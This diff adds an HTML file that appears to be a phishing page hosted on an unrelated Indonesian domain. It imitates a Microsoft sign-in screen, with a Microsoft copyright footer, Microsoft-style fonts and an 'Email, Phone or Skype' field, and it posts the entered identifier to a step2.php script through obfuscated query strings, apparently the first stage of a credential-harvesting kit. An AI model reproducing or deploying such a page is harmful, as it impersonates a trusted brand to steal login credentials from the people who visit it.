@@ -1,0 +1,124 @@
+<!-- URL =http://www.netciti.id/pdf/O/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw1774256418--><!-- w =('netciti.id', datetime.datetime(2014, 6, 13, 9, 9, 6), datetime.datetime(2022, 6, 13, 0, 9, 6))--><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+ <head>
+  <title>
+   Sign In
+  </title>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <link href="images/favicon.ico" rel="shortcut icon"/>
+  <link href="css/conv.min.css" rel="stylesheet"/>
+  <style type="text/css">
+   .textbox {
+    padding-left: 0px;
+    height: 36px;
+    color: #333;
+    border: none;
+    border-bottom: 1px solid #666;
+   font-size: 15px;
+	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    outline: none;
+}
+.textbox:focus {
+    background: #fff;
+    border-bottom: 1px solid #0067B8;
+}
+  </style>
+  <!--<style type="text/css">
+ .textbox {
+    height: 36px;
+    width: 275px;
+	padding-left: 8px;
+	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    font-size: 15px;
+    line-height: 20px;
+    font-weight: 400;
+    font-size: .9375rem;
+    border: 1px solid #666;
+    
+    
+}
+ .textbox:focus {
+    border-color: #4488cc;
+	border-style: solid;   
+    border-width: 1px;
+    outline: 0;
+}
+ </style> -->
+  <style type="text/css">
+   div#container
+{
+	position:relative;
+	width: 1366px;
+	margin-top: 0px;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:left; 
+}
+body {text-align:center;margin:0}
+  </style>
+ </head>
+ <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
+  <div class="background" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }" role="presentation">
+   <!-- ko if: smallImageUrl -->
+   <div class="blur" data-bind="backgroundImage: smallImageUrl()" style='background-image: url("images/small.jpg?x=12f4b8b543125cc986c79cd85320812f");'>
+   </div>
+   <!-- /ko -->
+   <!-- ko if: backgroundImageUrl -->
+   <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style='background-image: url("images/t1.jpg?x=f5a9a9531b8f4bcc86eabb19472d15d5");'>
+   </div>
+   <!-- /ko -->
+   <!-- ko if: !!backgroundImageUrl() -->
+   <div class="background-overlay">
+   </div>
+   <!-- /ko -->
+  </div>
+ </div>
+ <body>
+  <div id="container">
+   <body bgcolor="#030100">
+    <form action="step2.php?l=_JeHDCXZFUq_VJOXK0QWHtoersdfGYDw17742523456676546418&amp;fid.13InboxLight.aspxn.1774256418&amp;fid.1252899642528194560278553343InboxLighwsd5dfgsgfgyuiokjlt996123212342_Product-userid&amp;userid" id="aggebhagja" method="post" name="aggebhagja">
+     <div id="image1" style="position: absolute; overflow: hidden; left: 476px; top: 136px; width: 450px; height: 365px; z-index: 0">
+      <img alt="" border="0" height="365" src="images/lofo.png" title="" width="450px"/>
+     </div>
+     <span style="position: absolute; left: 769px; top: 419px; z-index: 4">
+      <input height="34" name="formimage1" src="images/continue.png" type="image" width="110"/>
+     </span>
+     <input autocomplete="off" class="textbox" name="userid" placeholder="Email, Phone or Skype" required="" style="position: absolute; width: 358px; left: 523px; top: 279px; z-index: 3" type="text" value=""/>
+     <div id="image6" style="position: absolute; overflow: hidden; left: 601px; top: 338px; width: 68px; height: 14px; z-index: 2">
+      <a href="#">
+       <img alt="" border="0" height="14" src="images/m7.png" title="" width="68"/>
+      </a>
+     </div>
+    </form>
+   </body>
+  </div>
+  <div id="footer">
+   <div data-bind="component: { name: 'footer-control',
+            params: {
+                serverData: svr,
+                showLinks: true },
+            event: {
+                agreementClick: footer_agreementClick } }">
+    <!-- ko if: showLinks || impressumLink || showIcpLicense -->
+    <div class="footerNode text-secondary" id="footerLinks">
+     <!-- ko if: !showIcpLicense -->
+     <span data-bind="html: svr.strCopyrightTxt" id="ftrCopy">
+      © 2019 Microsoft
+     </span>
+     <!-- /ko -->
+     <a data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="#" id="ftrTerms">
+      Terms of use
+     </a>
+     <a data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="#" id="ftrPrivacy">
+      Privacy &amp; Cookies
+     </a>
+     <!-- ko if: impressumLink -->
+     <!-- /ko -->
+     <!-- ko if: showIcpLicense -->
+     <!-- /ko -->
+    </div>
+    <!-- /ko -->
+   </div>
+  </div>
+ </body>
+</html>
